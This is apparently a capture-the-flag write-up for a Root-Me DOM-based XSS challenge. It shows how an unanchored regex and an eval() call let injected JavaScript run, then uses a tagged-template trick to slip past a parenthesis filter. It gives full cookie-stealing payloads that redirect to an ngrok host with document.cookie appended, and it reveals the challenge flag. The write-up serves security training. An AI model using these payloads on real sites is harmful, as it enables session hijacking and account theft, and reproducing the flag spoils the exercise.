# XSS DOM Based - Eval

**Point**: 40 Points 

**Description**: Steal the admin’s session cookie.

## Solution:

There's a simple calculator>

<p align="center"><img width="350px" height="150px" src="https://user-images.githubusercontent.com/48288606/159746731-8fe14ffd-1aff-4a52-9e5f-db4a8b2f288d.png"/></p>

Try enter `1 + 1`:

<p align="center"><img width="350px" height="200px" src="https://user-images.githubusercontent.com/48288606/159750532-1aff11d7-4eec-458e-861c-48d9b9bad165.png" /></p>

Try enter arbitrary format `khangtictoc`:

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159748134-7a189c79-7f45-4537-aa3b-8219b14d09a9.png" /></p>

Examine the source code a little bit. 

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159748670-fc8b1b6f-217e-473b-a8cd-85dfb723f8eb.png" /></p>

The program use directly the `eval` function. This is very dangerous, `eval()` can execute any javascript code, even from string with code format.

Try making XSS happen. This spend me a lots of stupid time, but i'm sure you all be aware of **vulnerable regex** in this case `/^\d+[\+|\-|\*|\/]\d+/`. With symbol `^`, this only check the if our first part of our string has format `number + number`. The place `+` can be any of  <br>`+ - * /`. A secure regex should contain `$` at the end to stabilize the input data. [Play with Regex](https://regexr.com/)

With this, we can inject our XSS code at the end of input. For example, try to enter this: `1 + 1, alert(1)`

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159750329-1f370e11-35e6-40db-aa39-b2bf40ab8e73.png" /></p>

Well, they've filtered character `()`. Try to use **Tagged Templates** [Research more here!](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#tagged_templates), use this payload ``1 + 1, alert`1` ``

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/159106743-5170454c-cd7f-4d88-a4d2-9b70a7945a44.png" /></p>

Yes!! Piece of cake. I just try to `alert(1)` to prove this. Actually, for final payload, we don't care if server filters `()` or not.
 
Now this proves XSS can be in action. Now we have to get the **cookie** from the victim, we ought to delivery all collected cookie from victim (administrator) to a specific server that we take control. Payload will look like this:

```text
1+1, document.location="{your_server_link_site}?cookie=" + document.cookie
```

Let's take action step-by-step:

1. Run PHP server with **localhost** and optional **port** without any content: `php -S localhost:4444 `

2. Public our server by tunneling. I use **ngrok** to serve this purpose:
   - Connect to ngrok with your account token: `ngrok authtoken {your_account_token}`
   - Tunneling our local site to public network with port specified above: `ngrok http 4444`
   - Get the public link we get from ngrok and create with payload above.
   ![image](https://user-images.githubusercontent.com/48288606/159753459-1bd85e80-cda4-41b1-8235-511514bee716.png)

3. Send our payload to cookie **status** and reload page:
```text
1+1, document.location="http://6b48-123-21-33-87.ngrok.io?cookie=" + document.cookie
``` 

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/159753758-510f5e86-a0d2-4ad6-b296-c31a1f4c6eba.png" /> </p>

Our payload is working.

There's one more problem we have to deal with. When we submit, the page quickly directs to our site so we can't have enough time to "collect" the URL. We should decode our payload ([Use this!](https://www.urlencoder.org/) and set **number** param with decoded value for creating our own links.

Encoded payload:

```text
1%2B1%2C%20document.location%3D%22http%3A%2F%2F6b48-123-21-33-87.ngrok.io%3Fcookie%3D%22%20%2B%20document.cookie
```
Assign it into **calculation** parameter in URL query. We have full payload:

```text
http://challenge01.root-me.org/web-client/ch34/?calculation=1%2B1%2C%20document.location%3D%22http%3A%2F%2F6b48-123-21-33-87.ngrok.io%3Fcookie%3D%22%20%2B%20document.cookie
```
**NOTE: You can check this payload by put it directly to URL search bar**

Move to "Contact" section. Send our payload to server. Wait for a while, check whether our server has received cookie or not.

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/159755071-b7dd6131-1b40-4e50-8650-16a1e476ad8d.png" /> </p>

FLag: **rootme{Eval_Is_DangER0us}**

